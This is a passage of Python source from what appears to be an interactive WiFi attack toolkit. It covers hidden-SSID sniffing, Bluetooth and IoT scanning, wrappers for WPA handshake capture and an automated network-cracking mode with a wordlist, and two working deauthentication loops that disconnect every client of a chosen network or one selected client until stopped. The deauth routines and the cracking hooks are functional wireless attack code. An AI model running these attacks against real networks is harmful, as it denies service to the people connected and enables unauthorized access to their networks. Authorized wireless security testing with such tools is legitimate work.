            self.console.print("[info]You can now manually connect to your WiFi network.[/]")
            
        except Exception as e:
            self.logger.log_evil_twin(f"Error during cleanup: {str(e)}", error=True)
            self.console.print(f"[bold red]Error during cleanup: {str(e)}[/]")
            
        finally:
            # Final verification of network service status
            self.verify_network_services()

    def verify_network_services(self):
        """Verify that network services are running correctly"""
        try:
            # Check NetworkManager status with timeout
            try:
                nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                if nm_status != "active":
                    self.console.print("[warning]NetworkManager is not active, attempting to restart...[/]")
                    try:
                        subprocess.run(["systemctl", "restart", "NetworkManager"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                        # Verify restart was successful
                        time.sleep(2)
                        nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                        if nm_status != "active":
                            subprocess.run(
                                ["systemctl", "start", "NetworkManager"],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                timeout=15,
                            )
                            time.sleep(2)
                            nm_status = subprocess.run(
                                ["systemctl", "is-active", "NetworkManager"],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                timeout=5,
                            ).stdout.decode().strip()
                        if nm_status != "active":
                            self.console.print("[error]Failed to restart or start NetworkManager[/]")
                    except subprocess.TimeoutExpired:
                        self.console.print("[error]NetworkManager restart timed out[/]")
                    except Exception as e:
                        self.console.print(f"[error]Error restarting NetworkManager: {str(e)}[/]")
            except subprocess.TimeoutExpired:
                self.console.print("[error]NetworkManager status check timed out[/]")
            except Exception as e:
                self.console.print(f"[error]Error checking NetworkManager: {str(e)}[/]")
            
            # Check wpa_supplicant status with timeout
            try:
                wpa_status = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                if wpa_status != "active":
                    self.console.print("[warning]wpa_supplicant is not active, attempting to restart...[/]")
                    try:
                        subprocess.run(["systemctl", "restart", "wpa_supplicant"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                        # Verify restart was successful
                        time.sleep(2)
                        wpa_status = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                        if wpa_status != "active":
                            self.console.print("[error]Failed to restart wpa_supplicant[/]")
                    except subprocess.TimeoutExpired:
                        self.console.print("[error]wpa_supplicant restart timed out[/]")
                    except Exception as e:
                        self.console.print(f"[error]Error restarting wpa_supplicant: {str(e)}[/]")
            except subprocess.TimeoutExpired:
                self.console.print("[error]wpa_supplicant status check timed out[/]")
            except Exception as e:
                self.console.print(f"[error]Error checking wpa_supplicant: {str(e)}[/]")
            
            # Verify interface mode: prefer `iw` (iwconfig often exits 161 without WE on modern drivers)
            try:
                mode = self.wifi_adapter.get_interface_type(self.interface_name)

                def _legacy_iwconfig_managed() -> Optional[bool]:
                    try:
                        r = subprocess.run(
                            ["iwconfig", self.interface_name],
                            capture_output=True,
                            text=True,
                            timeout=5,
                        )
                        if r.returncode != 0:
                            return None
                        return "Mode:Managed" in r.stdout
                    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                        return None

                if mode is None:
                    legacy = _legacy_iwconfig_managed()
                    if legacy is True:
                        mode = "managed"
                    elif legacy is False:
                        mode = "other"

                if mode == "managed":
                    pass
                elif mode is not None:
                    self.console.print("[warning]Interface not in managed mode, attempting to fix...[/]")
                    try:
                        subprocess.run(
                            ["ip", "link", "set", self.interface_name, "down"],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            timeout=5,
                        )
                        subprocess.run(
                            ["iw", self.interface_name, "set", "type", "managed"],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            timeout=5,
                        )
                        subprocess.run(
                            ["ip", "link", "set", self.interface_name, "up"],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            timeout=5,
                        )
                        time.sleep(2)
                        mode2 = self.wifi_adapter.get_interface_type(self.interface_name)
                        if mode2 != "managed" and _legacy_iwconfig_managed() is not True:
                            self.console.print("[error]Failed to set interface to managed mode[/]")
                    except subprocess.TimeoutExpired:
                        self.console.print("[error]Interface mode change timed out[/]")
                    except Exception as e:
                        self.console.print(f"[error]Error changing interface mode: {str(e)}[/]")
                else:
                    self.console.print(
                        "[warning]Could not read interface mode via `iw` or `iwconfig`; "
                        "skipped mode check (wireless-tools may be missing or driver has no WE).[/]"
                    )
            except Exception as e:
                self.console.print(f"[warning]Interface mode verification issue: {str(e)}[/]")
            
        except Exception as e:
            self.logger.error(f"Error during network service verification: {str(e)}")
            self.console.print("[error]Could not verify network services status[/]")

    def hidden_ssid_discovery(self):
        """Discovers hidden SSIDs in all available frequencies"""
        # Variables to track the original state
        original_interface = self.interface_name
        was_in_monitor_mode = self.interface_name.endswith("mon")
        
        # Check if monitor mode is active, if not switch to it
        if not was_in_monitor_mode:
            self.console.print("[bold blue]Interface is not in monitor mode, switching to monitor mode...[/]")
            if not self.start_monitor_mode():
                self.console.print("[bold red]Failed to enable monitor mode! Aborting.[/]")
                return
            self.console.print(f"[bold green]Successfully switched to monitor mode: {self.interface_name}[/]")

        hidden_networks = {}
        scanning = True
        stop_event = threading.Event()
        
        # Start time for tracking duration
        start_time = time.time()
        
        # Create header information and warning message
        self.console.print("[bold blue]Starting Hidden SSID Discovery...[/]")
        self.console.print("[warning]Press Ctrl+C at any time to stop the scanning process.[/]")
        self.console.print("[bold yellow]Scanning for hidden networks and waiting for probe requests...[/]")

        def create_status_table():
            table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Hidden SSID Discovery[/]")
            table.add_column("BSSID", style="cyan")
            table.add_column("Channel", style="green")
            table.add_column("Signal", style="blue")
            table.add_column("Clients", style="magenta")
            table.add_column("Encryption", style="red")
            table.add_column("Probes", style="yellow")
            
            for bssid, data in hidden_networks.items():
                probes_text = "\n".join(data['probes'][-3:]) if data['probes'] else "No probes yet"
                table.add_row(
                    bssid,
                    str(data['channel']),
                    f"{data['signal']} dBm",
                    str(len(data['clients'])),
                    data['encryption'],
                    probes_text
                )
            
            return table

        def packet_handler(pkt):
            # This function should not return anything
            if stop_event.is_set():
                return

            try:
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    bssid = pkt[Dot11].addr3
                    
                    # Check if SSID is hidden
                    if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                        if not ssid:  # Empty SSID indicates hidden network
                            # Get channel
                            try:
                                channel = int(ord(pkt[Dot11Elt:3].info))
                            except:
                                channel = 0
                            
                            # Get frequency
                            if channel >= 1 and channel <= 14:
                                frequency = 2407 + (channel * 5)
                            else:
                                frequency = 5000 + (channel * 5)
                            
                            # Get signal strength
                            try:
                                signal = -(256-ord(pkt.notdecoded[-4:-3]))
                            except:
                                signal = -100
                            
                            # Get encryption
                            encryption = self.get_security(pkt)
                            
                            current_time = datetime.now()
                            
                            if bssid not in hidden_networks:
                                hidden_networks[bssid] = {
                                    'channel': channel,
                                    'frequency': frequency,
                                    'signal': signal,
                                    'encryption': encryption,
                                    'clients': set(),
                                    'probes': [],
                                    'first_seen': current_time,
                                    'last_seen': current_time
                                }
                            else:
                                hidden_networks[bssid].update({
                                    'signal': signal,
                                    'last_seen': current_time
                                })
                
                # Process probe requests for hidden networks only
                elif pkt.haslayer(Dot11ProbeReq):
                    client_mac = pkt[Dot11].addr2
                    if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                        probe_ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                        if probe_ssid:  # Non-empty probe request
                            for network in hidden_networks.values():
                                if probe_ssid not in network['probes']:
                                    network['probes'].append(probe_ssid)
                
                # Process data frames for client detection (only for hidden networks)
                elif pkt.haslayer(Dot11) and pkt.type == 2:
                    bssid = pkt[Dot11].addr3
                    if bssid in hidden_networks:
                        src = pkt[Dot11].addr2
                        dst = pkt[Dot11].addr1
                        
                        if src and src != bssid:
                            hidden_networks[bssid]['clients'].add(src)
                        if dst and dst != bssid:
                            hidden_networks[bssid]['clients'].add(dst)
            
            except Exception as e:
                self.logger.error(f"Error processing packet: {str(e)}")
            
            # This function should not return anything
            return

        # Create a separate stop function
        def should_stop(pkt):
            return stop_event.is_set()

        def channel_hopper():
            while not stop_event.is_set():
                for channel in range(1, 15):  # 2.4 GHz channels
                    if stop_event.is_set():
                        break
                    try:
                        subprocess.run(["iwconfig", self.interface_name, "channel", str(channel)],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.5)
                    except:
                        pass

        try:
            # Start channel hopping thread
            hopper_thread = threading.Thread(target=channel_hopper)
            hopper_thread.daemon = True
            hopper_thread.start()

            # Use a simple manual refresh approach instead of Live for better compatibility
            while not stop_event.is_set():
                try:
                    # Display current scan information
                    elapsed = int(time.time() - start_time)
                    minutes = elapsed // 60
                    seconds = elapsed % 60
                    duration = f"{minutes:02d}:{seconds:02d}"
                    
                    # Clear screen and show updated information
                    os.system('clear' if os.name != 'nt' else 'cls')
                    
                    # Create status header
                    header = f"[bold blue]Hidden SSID Discovery - Duration: {duration}[/]"
                    self.console.print(header)
                    self.console.print(f"[bold yellow]Found {len(hidden_networks)} hidden networks[/]")
                    self.console.print("[bold red]Press Ctrl+C to stop scanning and return to main menu[/]")
                    
                    # Display network information if any found
                    if hidden_networks:
                        self.console.print(create_status_table())
                    else:
                        self.console.print("[bold yellow]Scanning for hidden networks... Please wait.[/]")
                    
                    # Perform packet sniffing for a short time
                    try:
                        sniff(iface=self.interface_name, 
                            prn=packet_handler,  # Packet processing function
                            store=0,
                            stop_filter=should_stop,  # Separate function for stop condition check
                            timeout=1)  # Short timeout for responsive updates
                    except KeyboardInterrupt:
                        self.console.print("\n[bold yellow]Stopping Hidden SSID discovery (Ctrl+C pressed)...[/]")
                        stop_event.set()
                        break
                    except Exception as e:
                        if not stop_event.is_set():
                            self.logger.error(f"Sniffing error: {str(e)}")
                        time.sleep(0.1)
                
                except KeyboardInterrupt:
                    self.console.print("\n[bold yellow]Stopping Hidden SSID discovery (Ctrl+C pressed)...[/]")
                    stop_event.set()
                    break
                
                # Biraz CPU rahatlatma
                time.sleep(0.2)
                
        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]Stopping Hidden SSID discovery (Ctrl+C pressed)...[/]")
            stop_event.set()
            
        finally:
            # Clean up
            stop_event.set()
            if 'hopper_thread' in locals():
                hopper_thread.join(timeout=1.0)
            
            # Show final results if any hidden networks were found
            if hidden_networks:
                self.console.print("\n[bold green]Hidden Networks Found:[/]")
                
                # Create a more detailed final result table
                final_table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Hidden Network Discovery Results[/]")
                final_table.add_column("BSSID", style="cyan")
                final_table.add_column("Channel", style="green")
                final_table.add_column("Signal", style="blue")
                final_table.add_column("Encryption", style="red")
                final_table.add_column("Discovered SSIDs", style="yellow")
                final_table.add_column("Connected Clients", style="magenta")
                
                for bssid, data in hidden_networks.items():
                    probes_text = "\n".join(data['probes']) if data['probes'] else "No SSIDs discovered"
                    clients_text = "\n".join(list(data['clients'])[:5]) if data['clients'] else "None detected"
                    
                    if len(data['clients']) > 5:
                        clients_text += f"\n... and {len(data['clients']) - 5} more"
                    
                    final_table.add_row(
                        bssid,
                        str(data['channel']),
                        f"{data['signal']} dBm",
                        data['encryption'],
                        probes_text,
                        clients_text
                    )
                
                self.console.print(final_table)
                
                # Display a summary of the scan
                total_duration = int(time.time() - start_time)
                minutes = total_duration // 60
                seconds = total_duration % 60
                
                self.console.print(f"\n[bold green]Scan completed in {minutes:02d}:{seconds:02d}[/]")
                self.console.print(f"[bold green]Found {len(hidden_networks)} hidden networks[/]")
                total_probes = sum(len(data['probes']) for data in hidden_networks.values())
                self.console.print(f"[bold green]Discovered {total_probes} potential SSIDs through probe requests[/]")
            else:
                self.console.print("\n[bold yellow]No hidden networks discovered.[/]")
            
            # Switch back to managed mode if we were not in monitor mode before
            if not was_in_monitor_mode:
                self.console.print("\n[bold blue]Switching back to managed mode...[/]")
                try:
                    # Disable monitor mode
                    subprocess.run(["airmon-ng", "stop", self.interface_name], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # Get original interface name (remove "mon" suffix if present)
                    if self.interface_name.endswith("mon"):
                        self.interface_name = self.interface_name[:-3]
                    
                    # Make sure interface is in managed mode
                    subprocess.run(["ip", "link", "set", self.interface_name, "down"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["iw", self.interface_name, "set", "type", "managed"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["ip", "link", "set", self.interface_name, "up"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # Restart NetworkManager
                    subprocess.run(["systemctl", "restart", "NetworkManager"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    self.console.print(f"[bold green]Successfully switched back to managed mode: {self.interface_name}[/]")
                    self.logger.info(f"Switched back to managed mode: {self.interface_name}")
                except Exception as e:
                    self.console.print(f"[bold red]Error switching back to managed mode: {str(e)}[/]")
                    self.logger.error(f"Error switching back to managed mode: {str(e)}")
            
            # Give user a chance to see the results
            self.console.print("\n[bold yellow]Press Enter to return to the main menu...[/]")
            input()
            
            # Return to tools menu
            self.current_menu = "tools"

    def bluetooth_iot_scanner(self):
        """Scan for Bluetooth and IoT devices"""
        self.console.clear()
        self.create_header()

        menu = """
        [bold cyan]Bluetooth & IoT Scanner[/]
        
        1. BLE device scanner
        2. IoT service discovery (mDNS)
        0. Back to tools menu
        """
        self.console.print(menu)
        
        choice = input("\nEnter your choice (0-2): ")
        
        if choice == "1":
            async def scan_ble_devices():
                devices = {}
                start_time = time.time()
                scan_duration = 60  # 60 seconds scan time
                
                def get_device_type(manufacturer_data, name):
                    """Determine device type based on manufacturer data and name"""
                    if not manufacturer_data and not name:
                        return "Unknown"
                        
                    # Apple devices
                    if 76 in manufacturer_data:  # Apple's company ID
                        if "AirPods" in name:
                            return "AirPods"
                        elif "Watch" in name:
                            return "Apple Watch"
                        elif "iPhone" in name:
                            return "iPhone"
                        return "Apple Device"
                    
                    # Common device types based on manufacturer IDs
                    manufacturer_types = {
                        6: "Microsoft Device",
                        117: "Samsung Device",
                        34819: "Govee Device",
                        89: "Intel Device",
                        10: "Nordic Semiconductor",
                        211: "Fitbit Device"
                    }
                    
                    # Check manufacturer IDs
                    for mfg_id in manufacturer_data.keys():
                        if mfg_id in manufacturer_types:
                            return manufacturer_types[mfg_id]
                    
                    # Check name-based device types
                    name_lower = name.lower()
                    if "speaker" in name_lower:
                        return "Bluetooth Speaker"
                    elif "headphone" in name_lower or "buds" in name_lower:
                        return "Headphones"
                    elif "watch" in name_lower:
                        return "Smartwatch"
                    elif "car" in name_lower:
                        return "Car System"
                    elif "tv" in name_lower:
                        return "Smart TV"
                    elif "mouse" in name_lower:
                        return "Mouse"
                    elif "keyboard" in name_lower:
                        return "Keyboard"
                    
                    return "Unknown BLE Device"
                
                def detection_callback(device, advertising_data):
                    device_type = get_device_type(advertising_data.manufacturer_data, device.name or "")
                    devices[device.address] = {
                        'name': device.name or "Unknown",
                        'rssi': advertising_data.rssi if advertising_data.rssi else "N/A",
                        'manufacturer_data': advertising_data.manufacturer_data,
                        'type': device_type,
                        'first_seen': datetime.now().strftime("%H:%M:%S")
                    }

                def create_status_table():
                    # Create and update the table with current results
                    table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold cyan]Discovered BLE Devices[/]")
                    table.add_column("MAC Address", style="cyan")
                    table.add_column("Name", style="green")
                    table.add_column("Device Type", style="blue")
                    table.add_column("RSSI (dBm)", style="yellow")
                    table.add_column("First Seen", style="magenta")
                    
                    for addr, dev in sorted(devices.items(), key=lambda x: x[1]['first_seen']):
                        table.add_row(
                            addr,
                            dev['name'],
                            dev['type'],
                            str(dev['rssi']),
                            dev['first_seen']
                        )
                    
                    # Add scan time information
                    elapsed = int(time.time() - start_time)
                    remaining = max(scan_duration - elapsed, 0)
                    time_info = f"\n[bold yellow]Scan Time: {elapsed}s / {scan_duration}s (Remaining: {remaining}s)[/]"
                    
                    return Group(table, time_info)

                try:
                    self.console.print("\n[info]Starting BLE scan (60 seconds)...[/]")
                    self.console.print("[yellow]Press Ctrl+C to stop scanning[/]")
                    
                    async with BleakScanner(detection_callback=detection_callback) as scanner:
                        with Live(create_status_table(), refresh_per_second=2) as live:
                            while (time.time() - start_time) < scan_duration:
                                live.update(create_status_table())
                                await asyncio.sleep(0.5)
                                
                    # Show final results
                    self.console.print("\n[success]Scan completed.[/]")
                    if devices:
                        self.console.print(create_status_table())
                    else:
                        self.console.print("\n[yellow]No BLE devices found[/]")
                        
                except KeyboardInterrupt:
                    self.console.print("\n[bold yellow]Scan stopped by user![/]")
                    if devices:
                        self.console.print(create_status_table())
                    else:
                        self.console.print("\n[yellow]No BLE devices found[/]")
                except Exception as e:
                    self.console.print(f"\n[bold red]Error during BLE scan: {str(e)}[/]")

            try:
                asyncio.run(scan_ble_devices())
            except KeyboardInterrupt:
                pass
                
        elif choice == "2":
            # Check if interface is in monitor mode
            try:
                iw_info = subprocess.check_output(["iwconfig", self.interface_name]).decode()
                if "Mode:Monitor" in iw_info:
                    self.console.print("[warning]Interface is in monitor mode. Switching to managed mode...[/]")
                    # Stop monitor mode
                    subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    # Get original interface name
                    self.interface_name = self.interface_name.replace("mon", "")
                    # Switch to managed mode
                    subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["iw", self.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    # Restart network services
                    subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(2)
                    self.console.print("[success]Interface switched to managed mode[/]")
            except Exception as e:
                self.console.print(f"[bold red]Error checking interface mode: {str(e)}[/]")
                return

            # Get current network information
            try:
                ip_info = subprocess.check_output(["ip", "route", "show"]).decode()
                default_network = None
                for line in ip_info.split('\n'):
                    if 'default via' in line:
                        # Extract network interface and gateway
                        parts = line.split()
                        gateway = parts[2]
                        interface = parts[4]
                        # Get network address
                        ip_addr = subprocess.check_output(["ip", "addr", "show", interface]).decode()
                        for addr_line in ip_addr.split('\n'):
                            if 'inet ' in addr_line:
                                network = addr_line.split()[1].split('/')[0]
                                default_network = '.'.join(network.split('.')[:-1]) + '.0/24'
                                break
                        break
            except:
                default_network = "192.168.1.0/24"

            # Ask for IP block
            self.console.print(f"\n[bold cyan]Current Network: {default_network}[/]")
            ip_block = Prompt.ask("Enter IP block to scan (e.g., 192.168.1.0/24)", default=default_network)

            # Validate IP block format
            try:
                import ipaddress
                network = ipaddress.ip_network(ip_block, strict=False)
            except ValueError:
                self.console.print("[bold red]Invalid IP block format! Using default network.[/]")
                ip_block = default_network

            class IoTListener:
                def __init__(self, console, target_network):
                    self.console = console
                    self.discovered_services = {}
                    self.target_network = ipaddress.ip_network(target_network, strict=False)
                    self.start_time = time.time()
                    self.scan_duration = 15  # 15 seconds scan
                
                def add_service(self, zc, type_, name):
                    info = zc.get_service_info(type_, name)
                    if info:
                        addresses = info.parsed_addresses()
                        # Filter addresses based on target network
                        valid_addresses = []
                        for addr in addresses:
                            try:
                                if ipaddress.ip_address(addr) in self.target_network:
                                    valid_addresses.append(addr)
                            except:
                                continue
                        
                        if valid_addresses:
                            self.discovered_services[name] = {
                                'type': type_,
                                'addresses': valid_addresses,
                                'port': info.port,
                                'server': info.server if hasattr(info, 'server') else "Unknown",
                                'properties': {k.decode(): v.decode() if isinstance(v, bytes) else v 
                                            for k, v in info.properties.items()} if info.properties else {},
                                'first_seen': datetime.now().strftime("%H:%M:%S")
                            }
                        
                        # Create and update the table
                        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title=f"[bold cyan]Discovered IoT Services in {self.target_network}[/]")
                        table.add_column("Name", style="cyan")
                        table.add_column("Type", style="green")
                        table.add_column("IP Addresses", style="yellow")
                        table.add_column("Port", style="blue")
                        table.add_column("First Seen", style="magenta")
                        
                        for service_name, service in sorted(self.discovered_services.items(), key=lambda x: x[1]['first_seen']):
                            table.add_row(
                                service_name,
                                service['type'],
                                "\n".join(service['addresses']),
                                str(service['port']),
                                service['first_seen']
                            )
                        
                        # Add scan time information
                        elapsed = int(time.time() - self.start_time)
                        remaining = max(self.scan_duration - elapsed, 0)
                        time_info = f"\n[bold yellow]Scan Time: {elapsed}s / {self.scan_duration}s (Remaining: {remaining}s)[/]"
                        
                        # Update display
                        self.console.clear()
                        self.console.print(f"\n[info]Scanning for IoT services in {self.target_network}...[/]")
                        self.console.print(Group(table, time_info))
                
                def update_service(self, zc, type_, name):
                    """Handle service updates"""
                    self.add_service(zc, type_, name)
                
                def remove_service(self, zc, type_, name):
                    if name in self.discovered_services:
                        del self.discovered_services[name]

            zeroconf = Zeroconf()
            listener = IoTListener(self.console, ip_block)
            
            service_types = [
                "_http._tcp.local.",
                "_https._tcp.local.",
                "_ipp._tcp.local.",
                "_printer._tcp.local.",
                "_airplay._tcp.local.",
                "_spotify-connect._tcp.local.",
                "_googlecast._tcp.local.",
                "_hue._tcp.local.",
                "_homekit._tcp.local.",
                "_smb._tcp.local.",
                "_mqtt._tcp.local.",
                "_nest-camera._tcp.local.",
                "_sonos._tcp.local.",
                "_raop._tcp.local."
            ]
            
            try:
                self.console.print(f"\n[info]Starting IoT service discovery in {ip_block}...[/]")
                self.console.print("[yellow]Press Ctrl+C to stop scanning[/]")
                browsers = [ServiceBrowser(zeroconf, service_type, listener) for service_type in service_types]
                
                # Wait for scan duration or until Ctrl+C
                start_time = time.time()
                try:
                    while (time.time() - start_time) < 15:  # 15 seconds scan
                        time.sleep(0.1)
                except KeyboardInterrupt:
                    self.console.print("\n[bold yellow]Scan stopped by user![/]")
                
                # Show final results
                if listener.discovered_services:
                    self.console.print("\n[success]Scan completed.[/]")
                else:
                    self.console.print("\n[yellow]No IoT services found in the specified network.[/]")
                    
            except Exception as e:
                self.console.print(f"\n[bold red]Error during IoT scan: {str(e)}[/]")
            finally:
                zeroconf.close()
        
        elif choice == "0":
            return
        
        input("\nPress Enter to continue...")

    def capture_handshake(self):
        """Captures WPA/WPA2/WPA3 handshake"""
        svc_run_capture_handshake(self)

    def _auto_hack_single_network(self, bssid, network, session_dir, wordlist, attack_progress=None):
        """Helper function for auto_hack to attack a single network in parallel"""
        return svc_run_auto_hack_single_network(
            self,
            bssid=bssid,
            network=network,
            session_dir=session_dir,
            wordlist=wordlist,
            attack_progress=attack_progress,
        )

    def _auto_hack_cleanup(self):
        """Safe cleanup for auto hack mode"""
        svc_run_auto_hack_cleanup(self)

    def _kill_processes(self, process_names):
        """Kill specific processes by name"""
        svc_run_kill_processes(self, process_names)

    def deauth_all_clients(self):
        """Deauthenticate all clients connected to the selected network"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return
            
        network = self.networks[self.selected_network]
        clients = network['clients']
        
        if not clients:
            self.console.print("[bold yellow]No clients connected to this network.[/]")
            return
            
        self.console.print(f"[bold yellow]Starting deauthentication attack on all clients of {network['ssid']}...[/]")
        self.console.print("[warning]This attack continues until you press Ctrl+C to stop it.[/]")
        
        # Start time of attack
        start_time = time.time()
        round_count = 0
        
        try:
            while True:  # Continue until Ctrl+C
                round_count += 1
                
                # Calculate elapsed time
                elapsed = int(time.time() - start_time)
                minutes = elapsed // 60
                seconds = elapsed % 60
                duration = f"{minutes:02d}:{seconds:02d}"
                
                # Print round header with duration
                self.console.print(f"\n[bold yellow]--- Round {round_count} | Duration: {duration} ---[/]")
                
                # Broadcast deauth
                self.console.print(f"[bold cyan]Broadcasting deauth to all clients on {network['ssid']}...[/]")
                subprocess.run(
                    aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                
                # Targeted deauth to each client
                self.console.print(f"[bold green]Targeting individual clients ({len(clients)}):[/]")
                
                for i, client in enumerate(clients, 1):
                    subprocess.run(
                        aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2, client=client),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=30,
                    )
                    
                    # Print progress
                    self.console.print(f"  [green]{i}/{len(clients)}[/] - Deauthing client: [cyan]{client}[/]")
                    
                    # Small delay between clients
                    time.sleep(0.1)
                
                # Round complete status
                self.console.print(f"[bold yellow]Round {round_count} complete - {len(clients)} clients deauthenticated[/]")
                self.console.print("[bold red]Press Ctrl+C to stop the attack[/]")
                
                # Wait before next round
                time.sleep(1.5)
                
        except KeyboardInterrupt:
            self.console.print("\n[bold green]Deauthentication attack stopped by user![/]")
            self.logger.info(f"Deauthentication attack stopped after {round_count} rounds")
        except Exception as e:
            self.console.print(f"\n[bold red]Error during deauthentication: {str(e)}[/]")
            self.logger.error(f"Error during deauthentication: {str(e)}")
        
    def deauth_single_client(self):
        """Deauthenticate a specific client connected to the selected network"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return
            
        network = self.networks[self.selected_network]
        clients = network['clients']
        
        if not clients:
            self.console.print("[bold yellow]No clients connected to this network.[/]")
            return
            
        # Display connected clients
        self.console.print(f"\n[bold yellow]Clients connected to {network['ssid']}:[/]")
        client_table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
        client_table.add_column("ID", style="cyan", justify="center")
        client_table.add_column("MAC Address", style="green")
        
        for idx, client in enumerate(clients, 1):
            client_table.add_row(str(idx), client)
            
        self.console.print(client_table)
        
        
        # Let user select client
        choice = Prompt.ask("Select client ID to deauthenticate (0 to cancel)", 
                          choices=["0"] + [str(i) for i in range(1, len(clients) + 1)])
        
        if choice == "0":
            return
            
        selected_client = list(clients)[int(choice) - 1]
        
        # Start time of attack
        start_time = time.time()
        packet_count = 0
        
        self.console.print(f"\n[bold yellow]Starting targeted deauthentication attack against client: {selected_client}[/]")
        self.console.print("[warning]This attack continues until you press Ctrl+C to stop it.[/]")
        
        try:
            while True:  # Continue until Ctrl+C
                packet_count += 2  # Each deauth call sends 2 packets by default
                
                # Calculate elapsed time
                elapsed = int(time.time() - start_time)
                minutes = elapsed // 60
                seconds = elapsed % 60
                duration = f"{minutes:02d}:{seconds:02d}"
                
                # Send deauth packets
                subprocess.run(
                    aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2, client=selected_client),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                
                # Determine status message based on packets sent
                if packet_count < 10:
                    status = f"[yellow]Starting attack[/]"
                elif packet_count < 50:
                    status = f"[green]Attack in progress[/]"
                else:
                    status = f"[bold green]Attack effective[/]"
                
                # Print status update on a single line
                self.console.print(f"\r[cyan]Client: {selected_client}[/] | [green]Network: {network['ssid']}[/] | {status} | [blue]Packets: {packet_count}[/] | [red]Duration: {duration}[/] [bold red](Ctrl+C to stop)[/]", end="")
                
                # Small delay before next deauth
                time.sleep(1.0)
                
        except KeyboardInterrupt:
            self.console.print("\n\n[bold green]Targeted deauthentication attack stopped by user![/]")
            self.logger.info(f"Targeted deauthentication attack against {selected_client} stopped after {packet_count} packets")
        except Exception as e:
            self.console.print(f"\n\n[bold red]Error during deauthentication: {str(e)}[/]")
            self.logger.error(f"Error during deauthentication: {str(e)}")

    def speed_test(self):
        """Tests network connection speed using available methods"""
        self.console.clear()
        self.create_header()
        
        # Title and description
        title = Panel(
            "[bold cyan]Network Speed Test[/bold cyan]",
            border_style=BORDER_STYLE,
            box=box.MINIMAL,
            expand=False
        )
        self.console.print(title)
        self.console.print("[yellow]Testing your internet connection speed...[/yellow]")
        
        # Internet connection check
        self.console.print("\n[bold blue]Step 1:[/bold blue] Checking Internet Connection...")
        
        try:
            # Simple connection test
            test_connection = self.command_runner.run(
                ping_command(count=1, timeout_seconds=2),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            if test_connection.returncode != 0:
                self.console.print("[error]No internet connection detected.[/]")
                self.console.print("[yellow]Please check your network connection and try again.[/]")
                self.console.print("\n[bold blue]Press Enter to return to the menu...[/]")
                input()
                return
            
            self.console.print("[success]Internet connection detected.[/]")
            
            # Start speedtest
            self.console.print("\n[bold blue]Step 2:[/bold blue] Starting Speed Test...")
            self.console.print("[yellow]This may take up to 30 seconds. Please wait...[/yellow]")

            download_time = 0.0
            upload_time = 0.0
            download_speed = 0.0
            upload_speed = 0.0
            
            # Progress bar display
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}"),
                BarColumn(),
                TextColumn("[bold green]{task.percentage:.0f}%"),
